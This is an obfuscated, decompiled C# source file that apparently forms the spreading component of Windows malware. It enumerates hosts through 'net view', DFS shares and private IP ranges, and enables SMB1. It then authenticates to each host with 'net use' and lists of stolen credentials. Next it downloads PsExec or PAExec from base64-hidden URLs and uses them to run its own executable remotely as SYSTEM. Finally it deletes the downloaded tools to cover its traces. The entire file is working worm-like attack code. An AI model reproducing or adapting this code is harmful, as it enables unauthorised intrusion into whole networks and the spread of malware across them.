using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace kuMeqwHpurUBOD;

internal class kRQDUzryMSl
{
	public class KqVXTbSRcQYaJzGOo
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum BngWFrPEMFij
	{
		jzuMrYuPJnv = 1,
		vfRRmLmIxNWz,
		LoimZyRrjkw,
		prnmaOlKtKgZuA,
		eAWcAoMGSuFX
	}

	public enum YGmqXvJtDkEy
	{
		ywJfTuwxhkfY,
		cRUwukJbtGBZtLW,
		elzRkncwQGZvD,
		INBTvnabEFP
	}

	public enum PxcrKvhDXsA
	{
		kFBQOKJYtFw = 1,
		RvZNooJAtrwTtBIbha = 2,
		HCpkDkpOda = 4,
		jWsijMyhyPMihdM = 8,
		qDAxcvJizJBJNV = 16,
		qsCJHFLrVdxx = 19
	}

	public enum OcMOKzcsaQRkpAXu
	{
		yTWbsJizAH,
		tFwAlNkmcOhL,
		HLAYmdSmEfoty,
		iizLqeZVHxG,
		FYpkSMzRjfCpb,
		hAQoOyfLfVmx,
		WOYBMlKmNta,
		rVWQdFgiESIhxkj,
		IXrSfNcmALwD,
		XylDAnCzDGzksA,
		LHqokQpBLDSqm,
		pZhpBUCsRboXKM
	}

	public class HOhoFavvjFpw : IEnumerable
	{
		private enum CTqvjZngJrQf
		{
			KhXggKtdBroziiWA = 0,
			GpNZLaZrPwQWF = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class TzjAwAoUiSuyK
		{
			public BngWFrPEMFij aYyuvPiKDep;

			public YGmqXvJtDkEy KPSHljiBLnC;

			public OcMOKzcsaQRkpAXu ZOGAFFLtxjzQet;

			public PxcrKvhDXsA AKGozQWRmPk;

			public string TTCmoWOCUl;

			public string JKVRxsnoDreu;

			public string CRrNzMGOhyv;

			public string DZhREFKOETn;
		}

		private ArrayList ifocoBLkZdZO = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern CTqvjZngJrQf WNetOpenEnumA(BngWFrPEMFij dwScope, YGmqXvJtDkEy dwType, PxcrKvhDXsA dwUsage, TzjAwAoUiSuyK p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern CTqvjZngJrQf WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern CTqvjZngJrQf WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(TzjAwAoUiSuyK tzjAwAoUiSuyK_0, BngWFrPEMFij bngWFrPEMFij_0, YGmqXvJtDkEy ygmqXvJtDkEy_0, PxcrKvhDXsA pxcrKvhDXsA_0, OcMOKzcsaQRkpAXu ocMOKzcsaQRkpAXu_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(bngWFrPEMFij_0, ygmqXvJtDkEy_0, pxcrKvhDXsA_0, tzjAwAoUiSuyK_0, out lphEnum) == CTqvjZngJrQf.KhXggKtdBroziiWA)
			{
				CTqvjZngJrQf cTqvjZngJrQf;
				do
				{
					cTqvjZngJrQf = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (cTqvjZngJrQf)
					{
					case CTqvjZngJrQf.GpNZLaZrPwQWF:
						continue;
					case CTqvjZngJrQf.KhXggKtdBroziiWA:
						Marshal.PtrToStructure(intPtr, tzjAwAoUiSuyK_0);
						if (tzjAwAoUiSuyK_0.ZOGAFFLtxjzQet == ocMOKzcsaQRkpAXu_0)
						{
							ifocoBLkZdZO.Add(tzjAwAoUiSuyK_0.JKVRxsnoDreu);
						}
						if ((tzjAwAoUiSuyK_0.AKGozQWRmPk & PxcrKvhDXsA.RvZNooJAtrwTtBIbha) == PxcrKvhDXsA.RvZNooJAtrwTtBIbha)
						{
							EnumerateServers(tzjAwAoUiSuyK_0, bngWFrPEMFij_0, ygmqXvJtDkEy_0, pxcrKvhDXsA_0, ocMOKzcsaQRkpAXu_0);
						}
						continue;
					}
					break;
				}
				while (cTqvjZngJrQf != CTqvjZngJrQf.GpNZLaZrPwQWF);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public HOhoFavvjFpw(BngWFrPEMFij bngWFrPEMFij_0, YGmqXvJtDkEy ygmqXvJtDkEy_0, PxcrKvhDXsA pxcrKvhDXsA_0, OcMOKzcsaQRkpAXu ocMOKzcsaQRkpAXu_0)
		{
			TzjAwAoUiSuyK tzjAwAoUiSuyK_ = new TzjAwAoUiSuyK();
			EnumerateServers(tzjAwAoUiSuyK_, bngWFrPEMFij_0, ygmqXvJtDkEy_0, pxcrKvhDXsA_0, ocMOKzcsaQRkpAXu_0);
		}

		public IEnumerator GetEnumerator()
		{
			return ifocoBLkZdZO.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct BbiqtcOCWGrlIADX
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string BxFwrJosXgC;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string KUEKpclaVog;

		public uint QkPaWjquYOfgGM;

		public uint FPGgQFLNkPwbxGnM;

		public IntPtr FTDqfrULJmWarZ;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct VDsfhSuzcX
	{
		public int QkPaWjquYOfgGM;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string DoiycNNbSQRkw;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string RRlcxbhVLYumI;
	}

	public struct BWWYAoevLwnZIm
	{
		public string LzcdOgwfmgogNGJ;

		public string[] OsbdPsECqA;

		public BWWYAoevLwnZIm(string string_0, string[] string_1)
		{
			LzcdOgwfmgogNGJ = string_0;
			OsbdPsECqA = string_1;
		}
	}

	private sealed class kMasmNqdLjwgR
	{
		public string lfHAwAUYNwsozV;

		public string FuiLlieEJVF;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith("10.") && !string_0.StartsWith("172.") && !string_0.StartsWith("192.168.") && !string_0.Contains("")) || !WxuDleZZaODM(string_0))
			{
				return;
			}
			try
			{
				if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
				{
					for (int i = 0; i < mjecbWlMAxoHXA.Count; i++)
					{
						BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use \\\\" + string_0 + " /USER:" + mjecbWlMAxoHXA[i] + " " + iECfpnwmQTyE[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use \\\\" + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
			{
				for (int j = 0; j < mjecbWlMAxoHXA.Count; j++)
				{
					if (BErRpdYOfQAwSr.hdKvmQeIrHY)
					{
						if (File.Exists(lfHAwAUYNwsozV))
						{
							BErRpdYOfQAwSr.uATAppcKlZ(lfHAwAUYNwsozV, "\\\\" + string_0 + " -u \"" + mjecbWlMAxoHXA[j] + "\" -p \"" + iECfpnwmQTyE[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(FuiLlieEJVF))
					{
						BErRpdYOfQAwSr.uATAppcKlZ(FuiLlieEJVF, "\\\\" + string_0 + " -u \"" + mjecbWlMAxoHXA[j] + "\" -p \"" + iECfpnwmQTyE[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (BErRpdYOfQAwSr.hdKvmQeIrHY)
			{
				if (File.Exists(lfHAwAUYNwsozV))
				{
					BErRpdYOfQAwSr.uATAppcKlZ(lfHAwAUYNwsozV, "\\\\" + string_0 + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(FuiLlieEJVF))
			{
				BErRpdYOfQAwSr.uATAppcKlZ(FuiLlieEJVF, "\\\\" + string_0 + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	private sealed class OvynuxFBYLotb
	{
		public string OKNKBiIskKoS;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != OKNKBiIskKoS;
		}
	}

	public static List<string> ItnfBOMlICm = new List<string>();

	public static string EJkpczassRlyQn = "";

	public static List<string> mjecbWlMAxoHXA = new List<string>();

	public static List<string> iECfpnwmQTyE = new List<string>();

	public static List<string> LgTKEhtjWMY = new List<string>();

	public static List<KqVXTbSRcQYaJzGOo> VQUYWxKLnn()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<KqVXTbSRcQYaJzGOo> list = new List<KqVXTbSRcQYaJzGOo>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new KqVXTbSRcQYaJzGOo
						{
							ServerName = "\\" + stringBuilder.ToString() + "\\Users"
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string LPgifXslMVMlGHo, int iLGuLpAunHjtd, int DyeMtdRfcNyCZ, out IntPtr bCPFwrSBmsf, [MarshalAs(UnmanagedType.I4)] out int PfGYTSMbKmkP, [MarshalAs(UnmanagedType.I4)] ref int ovIVbDzhNvpK);

	public static List<BWWYAoevLwnZIm> xGNmvvOWiVuK(string string_0)
	{
		try
		{
			List<BWWYAoevLwnZIm> list = new List<BWWYAoevLwnZIm>();
			IntPtr bCPFwrSBmsf = default(IntPtr);
			int PfGYTSMbKmkP = 0;
			int ovIVbDzhNvpK = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out bCPFwrSBmsf, out PfGYTSMbKmkP, ref ovIVbDzhNvpK) == 0)
			{
				for (int i = 0; i < PfGYTSMbKmkP; i++)
				{
					BbiqtcOCWGrlIADX bbiqtcOCWGrlIADX = (BbiqtcOCWGrlIADX)Marshal.PtrToStructure(bCPFwrSBmsf + i * Marshal.SizeOf(typeof(BbiqtcOCWGrlIADX)), typeof(BbiqtcOCWGrlIADX));
					if (bbiqtcOCWGrlIADX.BxFwrJosXgC == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < bbiqtcOCWGrlIADX.FPGgQFLNkPwbxGnM; j++)
					{
						IntPtr ptr = new IntPtr(bbiqtcOCWGrlIADX.FTDqfrULJmWarZ.ToInt64() + j * Marshal.SizeOf(typeof(VDsfhSuzcX)));
						VDsfhSuzcX vDsfhSuzcX = (VDsfhSuzcX)Marshal.PtrToStructure(ptr, typeof(VDsfhSuzcX));
						if (vDsfhSuzcX.QkPaWjquYOfgGM == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", vDsfhSuzcX.DoiycNNbSQRkw, vDsfhSuzcX.RRlcxbhVLYumI }));
						}
					}
					string text = bbiqtcOCWGrlIADX.BxFwrJosXgC.Replace(string_0, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new BWWYAoevLwnZIm(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void XWEwnDcFAIe()
	{
		BErRpdYOfQAwSr.EnvRhAFwnNeKeW("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<KqVXTbSRcQYaJzGOo> list = VQUYWxKLnn();
		List<BWWYAoevLwnZIm> list2 = xGNmvvOWiVuK(Environment.MachineName);
		if (list2 != null)
		{
			foreach (BWWYAoevLwnZIm item in list2)
			{
				string[] osbdPsECqA = item.OsbdPsECqA;
				foreach (string text in osbdPsECqA)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
						{
							for (int j = 0; j < mjecbWlMAxoHXA.Count; j++)
							{
								BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use " + text + " /USER:" + mjecbWlMAxoHXA[j] + " " + iECfpnwmQTyE[j]);
							}
						}
						else
						{
							BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use " + text);
						}
						BErRpdYOfQAwSr.nMCOBGfKnYn.Add(text.Replace("IPC$", ""));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (KqVXTbSRcQYaJzGOo item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
				{
					for (int k = 0; k < mjecbWlMAxoHXA.Count; k++)
					{
						BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use " + item2.ServerName + " /USER:" + mjecbWlMAxoHXA[k] + " " + iECfpnwmQTyE[k]);
					}
				}
				else
				{
					BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use " + item2.ServerName);
				}
				BErRpdYOfQAwSr.nMCOBGfKnYn.Add(item2.ServerName.Replace("IPC$", ""));
			}
			catch
			{
			}
		}
	}

	public static void cMlMdpeeaKGoIlR()
	{
		kMasmNqdLjwgR CS_0024_003C_003E8__locals0 = new kMasmNqdLjwgR();
		List<lVcAopDuxvDO> list = lVcAopDuxvDO.zyEAzUDHaOZgE();
		foreach (lVcAopDuxvDO item in list)
		{
			ItnfBOMlICm.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV = "";
		CS_0024_003C_003E8__locals0.FuiLlieEJVF = "";
		try
		{
			CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV = RSYaMvCvnzCczg();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.FuiLlieEJVF = fPHAxeiDuEQHp();
		}
		catch
		{
		}
		foreach (lVcAopDuxvDO item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith("10.") || item2.IPAddress.StartsWith("172.") || item2.IPAddress.StartsWith("192.168.") || item2.IPAddress.Contains(""))
				{
					bXjdBvlUbrss.EJytFPronPSni(item2.MacAddress, item2.IPAddress, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(ItnfBOMlICm, delegate(string string_0)
			{
				if ((string_0.StartsWith("10.") || string_0.StartsWith("172.") || string_0.StartsWith("192.168.") || string_0.Contains("")) && WxuDleZZaODM(string_0))
				{
					try
					{
						if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
						{
							for (int i = 0; i < mjecbWlMAxoHXA.Count; i++)
							{
								BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use \\\\" + string_0 + " /USER:" + mjecbWlMAxoHXA[i] + " " + iECfpnwmQTyE[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use \\\\" + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
					{
						for (int j = 0; j < mjecbWlMAxoHXA.Count; j++)
						{
							if (BErRpdYOfQAwSr.hdKvmQeIrHY)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV))
								{
									BErRpdYOfQAwSr.uATAppcKlZ(CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV, "\\\\" + string_0 + " -u \"" + mjecbWlMAxoHXA[j] + "\" -p \"" + iECfpnwmQTyE[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.FuiLlieEJVF))
							{
								BErRpdYOfQAwSr.uATAppcKlZ(CS_0024_003C_003E8__locals0.FuiLlieEJVF, "\\\\" + string_0 + " -u \"" + mjecbWlMAxoHXA[j] + "\" -p \"" + iECfpnwmQTyE[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (BErRpdYOfQAwSr.hdKvmQeIrHY)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV))
						{
							BErRpdYOfQAwSr.uATAppcKlZ(CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV, "\\\\" + string_0 + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.FuiLlieEJVF))
					{
						BErRpdYOfQAwSr.uATAppcKlZ(CS_0024_003C_003E8__locals0.FuiLlieEJVF, "\\\\" + string_0 + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV))
			{
				File.Delete(CS_0024_003C_003E8__locals0.lfHAwAUYNwsozV);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.FuiLlieEJVF))
			{
				File.Delete(CS_0024_003C_003E8__locals0.FuiLlieEJVF);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string RSYaMvCvnzCczg()
	{
		if (IntPtr.Size == 8)
		{
			return OUTWeeZfuTzTr(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return OUTWeeZfuTzTr(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string fPHAxeiDuEQHp()
	{
		if (IntPtr.Size == 8)
		{
			return OUTWeeZfuTzTr(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return OUTWeeZfuTzTr(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool WxuDleZZaODM(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string OUTWeeZfuTzTr(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> kyKQHCEMhl()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				OvynuxFBYLotb CS_0024_003C_003E8__locals0 = new OvynuxFBYLotb();
				CS_0024_003C_003E8__locals0.OKNKBiIskKoS = array4[j];
				if (CS_0024_003C_003E8__locals0.OKNKBiIskKoS.Contains(":"))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.OKNKBiIskKoS).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
